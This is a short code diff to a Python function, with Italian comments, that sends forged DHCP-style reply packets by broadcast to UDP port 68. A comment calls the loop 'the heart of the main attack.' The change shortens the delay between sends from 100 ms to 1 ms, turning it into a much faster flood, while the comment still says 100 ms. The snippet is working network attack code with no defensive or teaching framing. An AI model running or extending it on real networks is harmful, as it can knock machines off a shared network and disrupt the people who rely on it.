@@ -18,7 +18,7 @@ def start_engine():
             # Questo è il cuore dell'attacco principale
             payload = b"\x02\x01\x06\x00" + b"\x00" * 300 
             s.sendto(payload, ('255.255.255.255', 68))
-            time.sleep(0.1) # Attacco ogni 100ms (velocissimo!)
+            time.sleep(0.001) # Attacco ogni 100ms (velocissimo!)
             
     except Exception as e:
         print(f"Errore: {e}")
